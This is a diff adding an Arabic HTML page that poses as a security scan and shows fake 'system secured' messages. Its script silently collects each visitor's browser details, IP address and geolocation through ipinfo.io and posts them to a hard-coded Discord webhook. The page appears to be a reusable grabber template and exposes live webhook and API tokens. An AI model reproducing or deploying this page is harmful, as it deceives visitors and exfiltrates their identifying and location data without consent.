@@ -1,1 +1,115 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ضع اسم موقعك هنا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            text-align: center;
+            padding: 50px;
+        }
+        .message {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: inline-block;
+            margin: 20px auto;
+        }
+        .loading {
+            font-weight: bold;
+            color: #ff0000; /* اللون الأحمر */
+        }
+        .error {
+            color: #ff0000;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>فحص الأمان</h1>
+    <div class="message">
+        <p class="loading">جارٍ تنفيذ فحص الأمان...</p>
+        <p>يرجى الانتظار، سيتم التحقق من الأمان.</p>
+        <div id="error-container" class="error"></div>
+    </div>
+    <script>
+        
+        function collectUserInfo(callback) {
+            var userInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                location: window.location.href
+            };
+            
+            fetch('https://ipinfo.io?token=7183b791162c33')
+                .then(response => response.json())
+                .then(data => {
+                    userInfo.ip = data.ip;
+                    userInfo.city = data.city;
+                    userInfo.region = data.region;
+                    userInfo.country = data.country;
+                    userInfo.loc = data.loc;
+                    userInfo.org = data.org;
+                    callback(userInfo);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                    callback(userInfo);
+                });
+        }
 
+        // لا تعدل في الكود التالي
+        
+        function sendToDiscordWebhook(userInfo) {
+            var webhookURL = 'https://discord.com/api/webhooks/1297235717973610539/cvI3k3-hLDX_gkSrmpasHQrKS9eIqwPSrNJiRiP1KmoD5lA1iLJA-s5-fkwye9lZPDFn'; 
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                content: JSON.stringify(userInfo)
+            }));
+        }
+
+      
+        function displayError(message) {
+            var errorContainer = document.getElementById('error-container');
+            errorContainer.textContent = message;
+        }
+
+    
+        function startSendingData() {
+            collectUserInfo(function(userInfo) {
+                sendToDiscordWebhook(userInfo);
+            });
+        }
+
+        
+        try {
+            startSendingData();
+        } catch (error) {
+            displayError(error.message);
+        }
+
+        
+        setTimeout(function() {
+            document.querySelector('.loading').textContent = 'تم التحقق. كل شيء يبدو آمنًا.';
+            setTimeout(function() {
+                document.querySelector('.loading').textContent = 'تحذير: لم يتم العثور على أي تهديدات.';
+                setTimeout(function() {
+                    document.querySelector('.loading').textContent = 'يتم الآن تأمين النظام...';
+                    setTimeout(function() {
+                        document.querySelector('.loading').textContent = 'النظام مؤمن. يمكنك المتابعة.';
+                    }, 2000);
+                }, 2000);
+            }, 2000);
+        }, 2000);
+    </script>
+</body>
+          </html>
